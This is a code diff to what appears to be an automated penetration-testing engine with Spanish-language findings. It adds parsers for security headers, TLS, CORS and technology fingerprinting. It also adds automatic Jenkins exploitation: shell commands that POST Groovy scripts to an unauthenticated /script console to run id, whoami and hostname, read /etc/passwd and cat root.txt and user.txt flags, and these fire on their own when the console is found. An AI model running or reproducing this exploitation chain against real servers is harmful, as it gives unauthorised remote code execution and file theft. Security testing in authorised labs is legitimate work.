@@ -2076,6 +2076,241 @@ def _parse_tool_output(tool, output_text, rhost="", job_name=""):
             "evidence": "", "hosts": [rhost] if rhost else [], "source": "rsync-check",
         })
 
+    # ── HTTP Security Headers (curl -I / Web-Headers output) ─────────────────
+    # A professional pentester always checks and reports missing security headers.
+    # These generate real findings on EVERY web target — Apache default page, nginx,
+    # anything that responds with HTTP headers.
+    _is_http_headers = (
+        'Web-Headers' in job_name
+        or (re.search(r'^HTTP/[12]', output_text, re.MULTILINE)
+            and re.search(r'^(Server|Content-Type|Date):', output_text, re.MULTILINE | re.IGNORECASE))
+    )
+    if _is_http_headers and re.search(r'^HTTP/[12]\s+[23]\d\d', output_text, re.MULTILINE):
+        _hdr_lower = output_text.lower()
+
+        # Server version disclosure
+        _srv_m = re.search(r'^Server:\s*(.+)', output_text, re.MULTILINE | re.IGNORECASE)
+        if _srv_m:
+            _srv_val = _srv_m.group(1).strip()
+            if re.search(r'[\d]+\.[\d]+', _srv_val):  # has version number
+                findings.append({
+                    "id": str(uuid.uuid4()),
+                    "title": f"Info — Server Header Expone Versión ({_srv_val[:60]})",
+                    "severity": "low", "status": "open", "cve": "", "cvss": 5.3,
+                    "description": (
+                        f"La cabecera 'Server' expone la versión exacta del software: {_srv_val}. "
+                        "Facilita la identificación y selección de exploits por parte de un atacante."
+                    ),
+                    "evidence": _srv_m.group(0).strip(),
+                    "hosts": [rhost] if rhost else [], "source": "header-check",
+                })
+                # Cross-check with VERSION_CVE_MAP
+                _svc_guess = re.split(r'[/ ]', _srv_val)[0].lower()
+                _ver_guess = re.search(r'[\d]+\.[\d.]+', _srv_val)
+                if _ver_guess:
+                    _vf_srv = _match_version_cve(
+                        {"port": None, "service": _svc_guess, "version": _srv_val.lower()}, rhost
+                    )
+                    if _vf_srv and _vf_srv["title"] not in {f.get("title") for f in findings}:
+                        findings.append(_vf_srv)
+
+        # X-Powered-By disclosure
+        _xpb_m = re.search(r'^X-Powered-By:\s*(.+)', output_text, re.MULTILINE | re.IGNORECASE)
+        if _xpb_m:
+            _xpb_val = _xpb_m.group(1).strip()
+            findings.append({
+                "id": str(uuid.uuid4()),
+                "title": f"Info — X-Powered-By Header Expone Tecnología ({_xpb_val[:50]})",
+                "severity": "low", "status": "open", "cve": "", "cvss": 5.3,
+                "description": (
+                    f"La cabecera 'X-Powered-By' revela la tecnología del servidor: {_xpb_val}. "
+                    "Permite a atacantes dirigir ataques específicos a la plataforma."
+                ),
+                "evidence": _xpb_m.group(0).strip(),
+                "hosts": [rhost] if rhost else [], "source": "header-check",
+            })
+
+        # Missing security headers — each one is its own finding
+        _SECURITY_HEADERS = [
+            ("strict-transport-security",
+             "Web — Falta HSTS (HTTP Strict-Transport-Security)",
+             "medium", 6.1,
+             "Sin HSTS, el navegador puede conectar via HTTP inseguro. Permite ataques MITM y downgrade de TLS. "
+             "Añadir: Strict-Transport-Security: max-age=31536000; includeSubDomains"),
+            ("x-frame-options",
+             "Web — Falta X-Frame-Options (Clickjacking)",
+             "medium", 6.1,
+             "Sin X-Frame-Options, la página puede cargarse en un iframe malicioso (Clickjacking). "
+             "Añadir: X-Frame-Options: SAMEORIGIN  (o usar Content-Security-Policy frame-ancestors)"),
+            ("x-content-type-options",
+             "Web — Falta X-Content-Type-Options",
+             "low", 4.3,
+             "Sin X-Content-Type-Options: nosniff, el navegador puede interpretar respuestas como tipos MIME distintos. "
+             "Añadir: X-Content-Type-Options: nosniff"),
+            ("content-security-policy",
+             "Web — Falta Content-Security-Policy (CSP)",
+             "medium", 6.1,
+             "Sin CSP, ataques XSS tienen mayor impacto (no hay restricción en la carga de scripts externos). "
+             "Implementar una política CSP restrictiva para mitigar XSS y data injection."),
+            ("referrer-policy",
+             "Web — Falta Referrer-Policy",
+             "low", 3.7,
+             "Sin Referrer-Policy, las URL completas (incluyendo tokens/paths sensibles) se envían a terceros. "
+             "Añadir: Referrer-Policy: strict-origin-when-cross-origin"),
+            ("permissions-policy",
+             "Web — Falta Permissions-Policy",
+             "low", 3.7,
+             "Sin Permissions-Policy (Feature-Policy), el sitio no restringe el acceso a APIs sensibles del navegador. "
+             "Añadir: Permissions-Policy: camera=(), microphone=(), geolocation=()"),
+        ]
+        for _hdr_name, _hdr_title, _hdr_sev, _hdr_cvss, _hdr_desc in _SECURITY_HEADERS:
+            if _hdr_name not in _hdr_lower:
+                findings.append({
+                    "id": str(uuid.uuid4()),
+                    "title": _hdr_title,
+                    "severity": _hdr_sev, "status": "open",
+                    "cve": "", "cvss": _hdr_cvss,
+                    "description": _hdr_desc,
+                    "evidence": f"Cabecera ausente: {_hdr_name}",
+                    "hosts": [rhost] if rhost else [], "source": "header-check",
+                })
+
+    # ── WhatWeb technology fingerprinting ─────────────────────────────────────
+    # WhatWeb output: URL [200 OK] Apache[2.4.41], PHP[7.4], WordPress[5.9], ...
+    _is_whatweb = 'WhatWeb' in job_name or 'whatweb' in tool.lower()
+    if _is_whatweb and output_text.strip():
+        # Extract all [Technology[version]] pairs
+        _ww_seen = set()
+        for _ww_m in re.finditer(r'([\w][\w\-\.]{1,30})\[([^\]]{2,80})\]', output_text):
+            _tech, _ver = _ww_m.group(1), _ww_m.group(2)
+            # Skip IP addresses, status codes, country names
+            if re.match(r'^\d', _tech) or len(_tech) < 3 or _tech.lower() in (
+                    'ip', 'country', 'title', 'email', 'meta', 'script', 'html',
+                    'css', 'link', 'form', 'input', 'body', 'head', 'ok'):
+                continue
+            # Only process if version string has digits
+            if not re.search(r'\d', _ver):
+                continue
+            _combo = f"{_tech}/{_ver}"
+            if _combo in _ww_seen:
+                continue
+            _ww_seen.add(_combo)
+            # Try CVE match
+            _vf_ww = _match_version_cve(
+                {"port": None, "service": _tech.lower(), "version": f"{_tech.lower()} {_ver.lower()}"},
+                rhost
+            )
+            if _vf_ww and _vf_ww["title"] not in {f.get("title") for f in findings}:
+                findings.append(_vf_ww)
+            # Tech disclosure as low finding
+            if re.search(r'[\d]+\.[\d]+', _ver):
+                _disc_title = f"Info — Tecnología Expuesta: {_tech} {_ver[:30]}"
+                if _disc_title not in {f.get("title") for f in findings}:
+                    findings.append({
+                        "id": str(uuid.uuid4()),
+                        "title": _disc_title,
+                        "severity": "low", "status": "open", "cve": "", "cvss": 5.3,
+                        "description": (
+                            f"WhatWeb identificó {_tech} versión {_ver}. "
+                            "La exposición de versiones exactas facilita la búsqueda de CVEs conocidos."
+                        ),
+                        "evidence": f"{_tech}[{_ver}]",
+                        "hosts": [rhost] if rhost else [], "source": "whatweb",
+                    })
+
+    # ── SSL / TLS configuration findings ──────────────────────────────────────
+    # nmap ssl-enum-ciphers or testssl.sh output
+    _is_ssl_scan = any(k in job_name for k in ('SSL-Scan', 'ssl-enum', 'testssl', 'sslscan'))
+    if _is_ssl_scan or re.search(r'TLSv|SSLv|ssl-enum-ciphers', output_text, re.IGNORECASE):
+        # Deprecated TLS versions
+        for _tls_ver, _tls_sev, _tls_cvss in [
+            ('TLSv1.0', 'medium', 6.8),
+            ('TLSv1.1', 'medium', 5.9),
+            ('SSLv3',   'high',   7.5),
+            ('SSLv2',   'critical', 9.3),
+        ]:
+            if re.search(rf'\b{re.escape(_tls_ver)}\b', output_text, re.IGNORECASE):
+                _tls_title = f"SSL/TLS — {_tls_ver} Habilitado (Obsoleto)"
+                if _tls_title not in {f.get("title") for f in findings}:
+                    findings.append({
+                        "id": str(uuid.uuid4()),
+                        "title": _tls_title,
+                        "severity": _tls_sev, "status": "open",
+                        "cve": "CVE-2011-3389" if _tls_ver == "TLSv1.0" else "",
+                        "cvss": _tls_cvss,
+                        "description": (
+                            f"{_tls_ver} está habilitado. Este protocolo tiene vulnerabilidades conocidas "
+                            f"(BEAST, POODLE, SWEET32). PCI DSS 3.2+ lo prohíbe. "
+                            f"Deshabilitar en la configuración del servidor SSL/TLS."
+                        ),
+                        "evidence": f"{_tls_ver} detected",
+                        "hosts": [rhost] if rhost else [], "source": "ssl-check",
+                    })
+        # Weak ciphers
+        _WEAK_CIPHER_PATS = [
+            (r'\bRC4\b', 'RC4', 'high', 7.5),
+            (r'\bDES\b(?!-EDE)', 'DES', 'high', 7.5),
+            (r'\b3DES\b|DES-EDE', '3DES (SWEET32)', 'medium', 5.9),
+            (r'\bNULL\b', 'NULL cipher', 'critical', 9.8),
+            (r'\bEXPORT\b', 'EXPORT cipher', 'high', 7.5),
+            (r'\bANON\b|DH_anon|ECDH_anon', 'Anonymous cipher (no auth)', 'critical', 9.8),
+            (r'\bMD5\b.*\bRSA\b|\bRSA\b.*\bMD5\b', 'MD5-RSA signature', 'medium', 5.9),
+        ]
+        for _cp, _cpname, _cpsev, _cpcvss in _WEAK_CIPHER_PATS:
+            if re.search(_cp, output_text, re.IGNORECASE):
+                _cipher_title = f"SSL/TLS — Cipher Débil Habilitado: {_cpname}"
+                if _cipher_title not in {f.get("title") for f in findings}:
+                    findings.append({
+                        "id": str(uuid.uuid4()),
+                        "title": _cipher_title,
+                        "severity": _cpsev, "status": "open", "cve": "", "cvss": _cpcvss,
+                        "description": (
+                            f"Cipher suite inseguro detectado: {_cpname}. "
+                            "Puede permitir ataques de descifrado. Deshabilitar y usar solo AES-GCM o ChaCha20-Poly1305."
+                        ),
+                        "evidence": f"Cipher: {_cpname}",
+                        "hosts": [rhost] if rhost else [], "source": "ssl-check",
+                    })
+        # Self-signed or expired certificate
+        if re.search(r'self.signed|Self-signed|self_signed', output_text, re.IGNORECASE):
+            findings.append({
+                "id": str(uuid.uuid4()),
+                "title": "SSL/TLS — Certificado Autofirmado",
+                "severity": "medium", "status": "open", "cve": "", "cvss": 5.9,
+                "description": "El certificado SSL/TLS es autofirmado. Los navegadores mostrarán advertencias. "
+                               "Posible vector para MITM al ignorar advertencias.",
+                "evidence": "self-signed certificate",
+                "hosts": [rhost] if rhost else [], "source": "ssl-check",
+            })
+        if re.search(r'expired|certificate.*expir|not valid after', output_text, re.IGNORECASE):
+            findings.append({
+                "id": str(uuid.uuid4()),
+                "title": "SSL/TLS — Certificado Caducado",
+                "severity": "medium", "status": "open", "cve": "", "cvss": 5.9,
+                "description": "El certificado SSL/TLS ha expirado. Los navegadores rechazarán la conexión. "
+                               "Renovar inmediatamente.",
+                "evidence": "expired certificate detected",
+                "hosts": [rhost] if rhost else [], "source": "ssl-check",
+            })
+
+    # ── CORS misconfiguration ─────────────────────────────────────────────────
+    if re.search(r'CORS_MISCONFIGURED|access-control-allow-origin.*evil|access-control.*\*',
+                 output_text, re.IGNORECASE):
+        _cors_detail = re.search(r'(CORS_MISCONFIGURED[^\n]+)', output_text)
+        _cors_sev = "high" if "credentials" in output_text.lower() else "medium"
+        findings.append({
+            "id": str(uuid.uuid4()),
+            "title": "Web — CORS Mal Configurado (Cross-Origin Request Forgery)",
+            "severity": _cors_sev, "status": "open", "cve": "", "cvss": 7.5,
+            "description": (
+                "El servidor acepta orígenes arbitrarios o el comodín '*' en CORS. "
+                "Un atacante puede hacer peticiones autenticadas desde cualquier dominio "
+                "y leer las respuestas (CSRF + robo de datos)."
+            ),
+            "evidence": _cors_detail.group(0) if _cors_detail else "CORS misconfiguration detected",
+            "hosts": [rhost] if rhost else [], "source": "cors-check",
+        })
+
     # ── Tomcat default creds confirmed ────────────────────────────────────────
     if re.search(r'TOMCAT_CREDS_VALID:', output_text):
         m = re.search(r'TOMCAT_CREDS_VALID:(\S+)', output_text)
@@ -2135,14 +2370,25 @@ def _parse_tool_output(tool, output_text, rhost="", job_name=""):
             })
 
     # ── Jenkins accessible without auth ──────────────────────────────────────
-    if re.search(r'X-Jenkins:|Jenkins.*Accessible|/script.*200', output_text, re.IGNORECASE):
-        if re.search(r'200', output_text):
-            findings.append({
-                "id": str(uuid.uuid4()), "title": "Jenkins — Script Console Accesible Sin Auth",
-                "severity": "critical", "status": "open", "cve": "CVE-2018-1000861", "cvss": 9.8,
-                "description": "Jenkins /script accesible sin autenticación — RCE via Groovy Script Console.",
-                "evidence": "", "hosts": [rhost] if rhost else [], "source": "jenkins-check",
-            })
+    if re.search(r'X-Jenkins:|Jenkins_Script_Console=200|Jenkins.*Accessible|/script.*200',
+                 output_text, re.IGNORECASE):
+        # Check if RCE confirmed (uid= in output → direct Groovy exec worked)
+        _jenkins_rce = re.search(r'uid=\d+\(\w+\)', output_text)
+        _jenkins_title = (
+            "Jenkins — RCE Confirmado via Script Console (Groovy)" if _jenkins_rce
+            else "Jenkins — Script Console Accesible Sin Auth"
+        )
+        _jenkins_ev = _jenkins_rce.group(0) if _jenkins_rce else "/script returned HTTP 200"
+        findings.append({
+            "id": str(uuid.uuid4()), "title": _jenkins_title,
+            "severity": "critical", "status": "open", "cve": "CVE-2018-1000861", "cvss": 9.8,
+            "description": (
+                "Jenkins Script Console accesible sin autenticación. "
+                "Permite ejecutar código Groovy arbitrario en el servidor — RCE completo. "
+                "Explotar con: println('id'.execute().text)"
+            ),
+            "evidence": _jenkins_ev, "hosts": [rhost] if rhost else [], "source": "jenkins-check",
+        })
 
     # ── Elasticsearch unauthenticated ─────────────────────────────────────────
     if re.search(r'elasticsearch.*"cluster_name"|"status"\s*:\s*"(green|yellow)"', output_text, re.IGNORECASE):
@@ -4920,9 +5166,10 @@ def _kb_commands(port, service, version, target, mode):
         url = f"{scheme}://{target}:{port}"
         cmds += [
             (10, f"WhatWeb:{port}",
-             f"whatweb -a 3 {url} 2>/dev/null"),
+             f"whatweb -a 3 --no-errors {url} 2>/dev/null"),
             (12, f"Web-Headers:{port}",
-             f"curl -s -I -L --max-time 10 '{url}' 2>/dev/null | head -30"),
+             # Follow redirects (-L), show all response headers incl. final destination
+             f"curl -s -I -L --max-time 12 '{url}' 2>/dev/null"),
             (15, f"Web-Robots-Sitemap:{port}",
              f"curl -s --max-time 8 '{url}/robots.txt' 2>/dev/null; "
              f"curl -s --max-time 8 '{url}/sitemap.xml' 2>/dev/null | head -20"),
@@ -4963,14 +5210,44 @@ def _kb_commands(port, service, version, target, mode):
                  f" -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                  f" -s {port} {target} http-get /manager/html -t 4 -W 3 -f 2>/dev/null | head -10"),
             ]
+        # ── SSL/TLS check — always run on HTTPS, also try on HTTP (redirect) ─────
+        _ssl_port = port if scheme == "https" else (443 if port == 80 else port)
+        if scheme == "https" or port in (443, 8443):
+            cmds += [
+                (11, f"SSL-Scan:{port}",
+                 f"nmap -p {port} --script ssl-enum-ciphers,ssl-cert,ssl-dh-params"
+                 f" --script-timeout 25s {target} 2>/dev/null"),
+                (11, f"HSTS-Check:{port}",
+                 f"curl -s -I --max-time 8 '{url}/' 2>/dev/null | grep -i 'strict-transport\\|x-frame\\|content-security\\|x-content-type\\|referrer-policy' | head -10; "
+                 f"echo '---HSTS_CHECK_DONE---'"),
+            ]
+
+        # ── Jenkins script console direct check ────────────────────────────────
+        cmds += [
+            (19, f"Jenkins-Check:{port}",
+             f"JC=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 8 '{url}/script' 2>/dev/null); "
+             f"if [ \"$JC\" = '200' ]; then "
+             f"echo 'X-Jenkins: accessible'; "
+             f"RES=$(curl -s --max-time 10 -X POST '{url}/script' "
+             f"--data-urlencode 'script=println(\"id\".execute().text)' 2>/dev/null); "
+             f"echo \"$RES\" | grep -oE 'uid=[0-9]+\\([a-z]+\\)' | head -3; "
+             f"echo \"Jenkins_Script_Console=$JC\"; "
+             f"elif [ \"$JC\" = '403' ] || [ \"$JC\" = '401' ]; then "
+             f"echo \"Jenkins_Auth_Required=$JC\"; "
+             f"fi; "
+             f"JA=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 8 '{url}/jenkins/script' 2>/dev/null); "
+             f"[ \"$JA\" = '200' ] && echo 'X-Jenkins: accessible /jenkins'"),
+        ]
+
         if mode in ("normal", "aggressive"):
             cmds += [
                 (35, f"Nuclei:{port}",
-                 f"nuclei -u {url} -severity critical,high,medium -j -c 25 -timeout 15 2>/dev/null"),
+                 # -rl: rate limit; -timeout: per-request timeout; let the job runner kill at job_timeout
+                 f"nuclei -u {url} -severity critical,high,medium -j -c 20 -rl 50 -timeout 10 -nc 2>/dev/null"),
                 (38, f"Nuclei-DefaultLogins:{port}",
-                 f"nuclei -u {url} -t default-logins/ -j -c 10 -timeout 10 2>/dev/null"),
+                 f"nuclei -u {url} -t default-logins/ -j -c 10 -timeout 10 -nc 2>/dev/null"),
                 (39, f"Nuclei-Exposures:{port}",
-                 f"nuclei -u {url} -t exposures/ -t exposed-panels/ -t misconfiguration/ -j -c 15 -timeout 10 2>/dev/null"),
+                 f"nuclei -u {url} -t exposures/ -t exposed-panels/ -t misconfiguration/ -t technologies/ -j -c 15 -timeout 10 -nc 2>/dev/null"),
                 # JS secrets: crawl JS files then grep for API keys, tokens, endpoints
                 (43, f"JS-Secrets:{port}",
                  f"JSURLS=$(katana -u {url} -d 3 -jc -ef css,png,jpg,gif,ico,woff,ttf -silent 2>/dev/null | grep -E '\\.js(\\?|$)' | sort -u | head -40); "
@@ -6221,7 +6498,7 @@ class AutonomousEngine:
             (r'PHPMYADMIN_CREDS:', "phpMyAdmin — Acceso Confirmado", "high", "", 8.0),
             (r'SHELLSHOCK_RCE', "Shellshock RCE Confirmado", "critical", "CVE-2014-6271", 10.0),
             (r'LFI FOUND|root:x:0:0.*bash', "LFI — /etc/passwd Leído", "high", "", 7.5),
-            (r'Jenkins.*println.*uid=|groovy.*exec.*uid=', "Jenkins RCE via Groovy Script Confirmado", "critical", "CVE-2019-1003000", 9.8),
+            (r'Jenkins.*println.*uid=|groovy.*exec.*uid=|Jenkins_Script_Console=200.*uid=', "Jenkins RCE via Groovy Script Confirmado", "critical", "CVE-2019-1003000", 9.8),
             (r'PRIVESC_POSSIBLE_SUDO.*ESCALATED|uid=0.*sudo', "PrivEsc via sudo NOPASSWD — Root Obtenido", "critical", "", 9.8),
             (r'root\.txt[:\s]+[a-fA-F0-9]{32}', "Flag Root Capturada", "critical", "", 10.0),
             # ADCS
@@ -6353,6 +6630,23 @@ class AutonomousEngine:
     # ── BLOCK 2: Reactive exploitation — triggered immediately on critical finds
     def _react_to_findings(self, output, target, tool_name):
         ol = output.lower()
+
+        # Jenkins Script Console accessible → direct Groovy RCE (no LHOST needed)
+        if re.search(r'Jenkins_Script_Console=200|X-Jenkins.*accessible', output, re.I):
+            _jenkins_key = f"Jenkins-RCE:{target}"
+            # Detect the port from job name context
+            _jport_m = re.search(r':(\d+)', tool_name) if ':' in tool_name else None
+            _jport = _jport_m.group(1) if _jport_m else "8080"
+            _jurl = f"http://{target}:{_jport}"
+            if self._enqueue(0, _jenkins_key,
+                f"curl -s --max-time 15 -X POST '{_jurl}/script' "
+                f"--data-urlencode 'script=println(new File(\"/etc/passwd\").text)' 2>/dev/null | head -5; "
+                f"curl -s --max-time 15 -X POST '{_jurl}/script' "
+                f"--data-urlencode 'script=[\"id\",\"whoami\",\"hostname\"].each{{cmd->println(cmd.execute().text)}}' 2>/dev/null | head -10; "
+                f"curl -s --max-time 15 -X POST '{_jurl}/script' "
+                f"--data-urlencode 'script=def p=\"cat /root/root.txt 2>/dev/null || cat /home/*/user.txt 2>/dev/null\".execute(); println(p.text)' 2>/dev/null | head -5",
+                target):
+                self._log(f"REACT [{target}] Jenkins Script Console → Groovy RCE directo")
 
         # ms17-010 VULNERABLE → EternalBlue MSF priority 0
         # Requires both the script name AND VULNERABLE to appear anywhere in output (multiline-safe)
